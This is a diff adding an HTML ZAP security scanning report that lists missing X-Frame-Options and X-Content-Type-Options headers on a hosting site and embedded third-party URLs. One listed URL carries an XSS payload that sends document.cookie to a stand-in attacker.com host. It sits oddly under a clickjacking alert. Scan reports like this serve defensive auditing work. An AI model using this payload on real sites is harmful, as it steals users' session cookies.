@@ -1,0 +1,2107 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>ZAP Scanning Report</title>
+<style>
+body{
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  color: #000;
+  font-size: 13px;
+}
+h1{
+  text-align: center;
+  font-weight: bold;
+  font-size: 32px
+}
+h3{
+  font-size: 16px;
+}
+table{
+  border: none;
+  font-size: 13px;
+}
+td, th {
+  padding: 3px 4px;
+}
+th{
+  font-weight: bold;
+}
+.results th{
+  text-align: left;
+}
+.spacer{
+  margin: 10px;
+}
+.spacer-lg{
+  margin: 40px;
+}
+.indent1{
+  padding: 4px 20px;
+}
+.indent2{
+  padding: 4px 40px;
+}
+.risk-high{
+  background-color: red;
+  color: #FFF;
+}
+.risk-medium{
+  background-color: orange;
+  color: #FFF;
+}
+.risk-low{
+  background-color: yellow;
+  color: #000;
+}
+.risk-info{
+  background-color: blue;
+  color: #FFF;
+}
+.summary th{
+  color: #FFF;
+}
+</style>
+</head>
+<body>
+<h1>
+<img src="data:image/png;base64,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">
+ZAP Scanning Report
+</h1>
+<p>
+
+</p>
+<h3>Summary of Alerts</h3>
+<table width="45%" class="summary">
+<tr bgcolor="#666666">
+<th width="45%" height="24">Risk 
+      Level</th><th width="55%" align="center">Number 
+      of Alerts</th>
+</tr>
+<tr bgcolor="#e8e8e8">
+<td><a href="#high">High</a></td><td align="center">0</td>
+</tr>
+<tr bgcolor="#e8e8e8">
+<td><a href="#medium">Medium</a></td><td align="center">3</td>
+</tr>
+<tr bgcolor="#e8e8e8">
+<td><a href="#low">Low</a></td><td align="center">12</td>
+</tr>
+<tr bgcolor="#e8e8e8">
+<td><a href="#info">Informational</a></td><td align="center">0</td>
+</tr>
+</table>
+<div class="spacer-lg"></div>
+<h3>Alert Detail</h3>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-medium">
+<th width="20%"><a name="medium"></a>Medium (Medium)</th><th width="80%">X-Frame-Options Header Not Set</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>X-Frame-Options header is not included in the HTTP response to protect against 'ClickJacking' attacks.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d2842.5003378599404!2d55.38358165988975!3d25.11177058898032!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3e5f644400000001%3A0x60a9746d88e1664d!2sBuzinessware-+Middle+East+Hosting+Specialists!5e0!3m2!1sen!2sae!4v1490248776596</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">1</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Most modern Web browsers support the X-Frame-Options HTTP header. Ensure it's set on all web pages returned by your site (if you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. ALLOW-FROM allows specific websites to frame the web page in supported web browsers).</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>http://blogs.msdn.com/b/ieinternals/archive/2010/03/30/combating-clickjacking-with-x-frame-options.aspx</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">16</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">15</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-medium">
+<th width="20%"><a name="medium"></a>Medium (Medium)</th><th width="80%">X-Frame-Options Header Not Set</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>X-Frame-Options header is not included in the HTTP response to protect against 'ClickJacking' attacks.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://msoffice365.ae/contact-sales.html?reason=%3Cscript%3Edocument.location=%27https://attacker.com/log.php?c=%27%20+%20encodeURIComponent(document.cookie)%3C/script%3E</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">1</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Most modern Web browsers support the X-Frame-Options HTTP header. Ensure it's set on all web pages returned by your site (if you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. ALLOW-FROM allows specific websites to frame the web page in supported web browsers).</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>http://blogs.msdn.com/b/ieinternals/archive/2010/03/30/combating-clickjacking-with-x-frame-options.aspx</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">16</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">15</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-medium">
+<th width="20%"><a name="medium"></a>Medium (Medium)</th><th width="80%">X-Frame-Options Header Not Set</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>X-Frame-Options header is not included in the HTTP response to protect against 'ClickJacking' attacks.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/open_chat.cgi?groups=2&amp;embedded=1&amp;newWebserv=undefined&amp;__lc_vv=2&amp;session_id=S1513858898.257ad89b2a&amp;server=secure.livechatinc.com</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">1</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Most modern Web browsers support the X-Frame-Options HTTP header. Ensure it's set on all web pages returned by your site (if you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. ALLOW-FROM allows specific websites to frame the web page in supported web browsers).</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>http://blogs.msdn.com/b/ieinternals/archive/2010/03/30/combating-clickjacking-with-x-frame-options.aspx</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">16</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">15</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-low">
+<a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">X-Content-Type-Options Header Missing</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://shavar.services.mozilla.com/downloads?client=navclient-auto-ffox&amp;appver=57.0&amp;pver=2.2</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">POST</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">1</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Other information</td><td width="80%"><p>This issue still applies to error type pages (401, 403, 500, etc) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.</p><p>At "High" threshold this scanner will not alert on client or server error responses.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>http://msdn.microsoft.com/en-us/library/ie/gg622941%28v=vs.85%29.aspx</p><p>https://www.owasp.org/index.php/List_of_useful_HTTP_headers</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">16</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">15</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-low">
+<a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">X-Content-Type-Options Header Missing</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://maps.googleapis.com/maps/api/js/ViewportInfoService.GetViewportInfo?1m6&amp;1m2&amp;1d25.102902876800396&amp;2d55.37405046353024&amp;2m2&amp;1d25.121213229487&amp;2d55.394132785831744&amp;2u13&amp;4sen-US&amp;5e2&amp;7b0&amp;8e0&amp;11e289&amp;callback=_xdc_._w0a4w0&amp;token=73480</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://maps.googleapis.com/maps/api/js?client=google-maps-embed&amp;paint_origin=&amp;libraries=geometry,search&amp;v=3.exp&amp;language=en_US&amp;region=ae</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://maps.googleapis.com/maps/api/js/AuthenticationService.Authenticate?1shttps%3A%2F%2Fwww.google.com%2Fmaps%2Fembed%3Fpb%3D!1m18!1m12!1m3!1d2842.5003378599404!2d55.38358165988975!3d25.11177058898032!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3e5f644400000001%253A0x60a9746d88e1664d!2sBuzinessware-%2BMiddle%2BEast%2BHosting%2BSpecialists!5e0!3m2!1sen!2sae!4v1490248776596&amp;2sgoogle-maps-embed&amp;callback=_xdc_._1th2s7&amp;token=121087</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://maps.googleapis.com/maps/api/js/QuotaService.RecordEvent?1shttps%3A%2F%2Fwww.google.com%2Fmaps%2Fembed%3Fpb%3D!1m18!1m12!1m3!1d2842.5003378599404!2d55.38358165988975!3d25.11177058898032!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3e5f644400000001%253A0x60a9746d88e1664d!2sBuzinessware-%2BMiddle%2BEast%2BHosting%2BSpecialists!5e0!3m2!1sen!2sae!4v1490248776596&amp;2sgoogle-maps-embed&amp;7sth11iv&amp;10e1&amp;callback=_xdc_._hjmrzo&amp;token=54158</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://maps.googleapis.com/maps/api/js/ViewportInfoService.GetViewportInfo?1m6&amp;1m2&amp;1d25.103097171925487&amp;2d55.367055847095344&amp;2m2&amp;1d25.121166598919&amp;2d55.401446046857245&amp;2u16&amp;4sen-US&amp;5e0&amp;6sm%40405000000&amp;7b0&amp;8e0&amp;11e289&amp;callback=_xdc_._3nad5q&amp;token=40612</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">5</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Other information</td><td width="80%"><p>This issue still applies to error type pages (401, 403, 500, etc) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.</p><p>At "High" threshold this scanner will not alert on client or server error responses.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>http://msdn.microsoft.com/en-us/library/ie/gg622941%28v=vs.85%29.aspx</p><p>https://www.owasp.org/index.php/List_of_useful_HTTP_headers</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">16</td>
+</tr>
